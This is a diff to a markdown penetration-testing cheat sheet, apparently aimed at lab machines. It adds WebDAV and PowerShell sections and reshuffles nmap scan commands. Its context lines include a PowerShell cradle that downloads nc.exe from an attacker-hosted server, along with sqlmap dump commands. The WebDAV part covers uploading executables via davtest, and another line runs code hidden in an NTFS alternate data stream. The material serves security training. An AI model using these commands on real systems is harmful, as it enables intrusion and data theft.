@@ -26,6 +26,8 @@
 24. [SQLInjection](#SQLInjection)
 25. [Wireshark](#Wireshark)
 26. [OSINT](#OSINT) 
+28. [WebDAV](#WebDAV)
+29. [PowerShell](#PowerShell)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -82,7 +84,7 @@ screen cmd.log
 exit
 ```
 
-## Fix VPN routing issue (same subnet)
+## Fix VPN routing issue (HTB)
 
 ```bash
 fixvpn='sudo route del -net 10.10.10.0 gw 10.10.14.1 netmask 255.255.255.0 dev tun0'
@@ -104,12 +106,6 @@ python3 -m http.server 8080
 2. ``` stty raw -echo```
 3. ```fg``` to foreground session again
 
-## Switch User without providing Password
-
-```bash
-sudo -u scriptmanager bash -i
-```
-
 ## Password List
 
 :information_source: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
@@ -118,12 +114,9 @@ sudo -u scriptmanager bash -i
 
 ``` bash
 nmap -sC -sV -oA outfile 192.168.1.0/24
-```
 nmap -Pn -n -p21,22,139,445,3632 --script vuln -sV -oN nmap/vuln_scan 10.10.10.3
 nmap -T4 -Pn -p- <TARGET> -o tmp.nmap > /dev/null
 nmap -sC -sV -o portscan.nmap -p $(cat tmp.nmap | grep open | cut -d\t -f1 | sed 's/\///g' | paste -sd, ) <TARGET> > /dev/null
-
-```bash
 for i in `nmap -T4 -p- 192.168.67.133 |grep open |cut -f 1 -d /` ; do nmap -T4 -p$i -A 192.168.67.133; done
 ```
 
@@ -633,13 +626,11 @@ IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.23:8000/nc.ex
 ### [windows-exploit-suggester.py (local)](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 this script uses python2 which can lead to issues. create virtualenv and make sure you are using xlrd version 1.2.0
 ```
-virtualenv -p /usr/bin/python2 venv
+virtualenv -p /usr/bin/python2.7 venv
 source venv/bin/activate
 pip install xlrd==1.2.0
 ./windows-exploit-suggester.py --database 2020-12-12-mssb.xls --systeminfo sysinfo.txt
 ```
-
-
 
 ## [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
 
@@ -1105,5 +1096,72 @@ sqlmap -r sqlpanel.request --dbms=sqlite --dump-all --tamper=space2comment
 * https://haveibeenpwned.com/
 * https://scylla.sh    # provides password, free
 * https://dehashed.com/   # provides password, paid
+
+# WebDAV
+WebDAV is an extenstion of HTTP that allows clients to perform remote Web content authoring operations. RFC4918.
+
+## Resources
+* [Blogpost from Nullbyte](https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/)
+* HackTheBox: Granny 
+
+## davtest
+DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target.
+```
+davtest -url http://10.10.10.15
+```
+
+## cadaver
+Cadaver is a simple command-line client, similar to for example the 'ftp' program. It has some advanced features such as lock-management, property management, DASL and version control support.
+```
+cadaver http://10.10.10.15/mfu
+```
+
+# PowerShell
+## Commands
+### Get-ChildItem
+* ```-Path``` Specifies a path to one or more locations. Wildcards are accepted.
+* ```-File``` / -Directory To get a list of files, use the File parameter. To get a list of directories, use the Directory parameter. You can use the Recurse parameter with File and/or Directory parameters.
+* ```-Filter``` Specifies a filter to qualify the Path parameter.
+* ```-Recurse``` Gets the items in the specified locations and in all child items of the locations.
+* ```-Hidden``` To get only hidden items, use the Hidden parameter.
+* ```-ErrorAction``` SilentlyContinue Specifies what action to take if the command encounters an error.
+```
+Get-ChildItem -Hidden
+Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
+```
+
+### Get-Content
+```
+Get-Content -Path file.txt
+Get-Content file.txt | Select -first 10
+Get-Content file.txt | Select-String 'searchstring'
+Get-Content -Path file.txt | Measure-Object -Word
+(Get-Content -Path file.txt)[index]
+```
+
+## Select-String
+```
+Select-String -Path 'c:\users\administrator\desktop' -Pattern '*.pdf'
+Select-String -Path file.txt -Pattern 'searchstring'
+```
+
+## Get-FileHash
+```
+Get-FileHash -Algorithm MD5 file.txt
+```
+
+## Strings.exe
+```
+C:\Tools\strings64.exe -accepteula file.exe
+```
+
+## Alternate Data Stream (ADS)
+Alternate Data Streams (ADS) is a file attribute specific to Windows NTFS (New Technology File System). Every file has at least one data stream ($DATA) and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn't display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files.
+
+```
+Get-Item -Path file.exe -Stream *
+
+wmic process call create $(Resolve-Path file.exe:streamname)
+```
 
 
